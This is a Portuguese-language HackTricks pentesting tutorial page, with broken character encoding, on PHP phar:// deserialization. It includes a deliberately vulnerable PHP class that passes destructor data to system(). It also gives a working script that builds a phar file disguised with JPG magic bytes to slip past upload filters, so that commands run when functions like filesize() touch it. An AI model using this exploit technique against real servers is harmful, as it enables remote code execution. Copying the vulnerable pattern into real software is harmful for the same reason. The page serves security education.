# phar:// deserializaÃ§Ã£o

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Trabalha numa **empresa de ciberseguranÃ§a**? Quer ver a sua **empresa anunciada no HackTricks**? ou quer ter acesso Ã  **versÃ£o mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o** [**repositÃ³rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositÃ³rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se estÃ¡ interessado numa **carreira em hacking** e em hackear o inquebrÃ¡vel - **estamos contratando!** (_fluÃªncia em polonÃªs escrita e falada exigida_).

{% embed url="https://www.stmcyber.com/careers" %}

Arquivos **Phar** (PHP Archive) **contÃªm metadados em formato serializado**, entÃ£o, quando analisados, esses **metadados** sÃ£o **desserializados** e vocÃª pode tentar abusar de uma vulnerabilidade de **desserializaÃ§Ã£o** dentro do cÃ³digo **PHP**.

O melhor dessa caracterÃ­stica Ã© que essa desserializaÃ§Ã£o ocorrerÃ¡ mesmo usando funÃ§Ãµes PHP que nÃ£o executam cÃ³digo PHP como **file\_get\_contents(), fopen(), file() ou file\_exists(), md5\_file(), filemtime() ou filesize()**.

EntÃ£o, imagine uma situaÃ§Ã£o onde vocÃª pode fazer com que um web PHP obtenha o tamanho de um arquivo arbitrÃ¡rio usando o protocolo **`phar://`**, e dentro do cÃ³digo vocÃª encontra uma **classe** semelhante Ã  seguinte:

{% code title="vunl.php" %}
```php
<?php
class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

filesize("phar://test.phar"); #The attacker can control this path
```
{% endcode %}

VocÃª pode criar um arquivo **phar** que, quando carregado, **abusarÃ¡ desta classe para executar comandos arbitrÃ¡rios** com algo como:

{% code title="create_phar.php" %}
```php
<?php

class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```
{% endcode %}

Note como os **bytes mÃ¡gicos do JPG** (`\xff\xd8\xff`) sÃ£o adicionados no inÃ­cio do arquivo phar para **burlar** **possÃ­veis** restriÃ§Ãµes de **upload** de arquivos.\
**Compile** o arquivo `test.phar` com:
```bash
php --define phar.readonly=0 create_phar.php
```
E execute o comando `whoami` abusando do cÃ³digo vulnerÃ¡vel com:
```bash
php vuln.php
```
### ReferÃªncias

{% embed url="https://blog.ripstech.com/2018/new-php-exploitation-technique/" %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se vocÃª tem interesse em **carreira de hacking** e em hackear o inquebrÃ¡vel - **estamos contratando!** (_fluÃªncia em polonÃªs escrita e falada Ã© necessÃ¡ria_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? Quer ver sua **empresa anunciada no HackTricks**? Ou quer ter acesso Ã  **versÃ£o mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Adquira o [**material oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o repositÃ³rio** [**hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
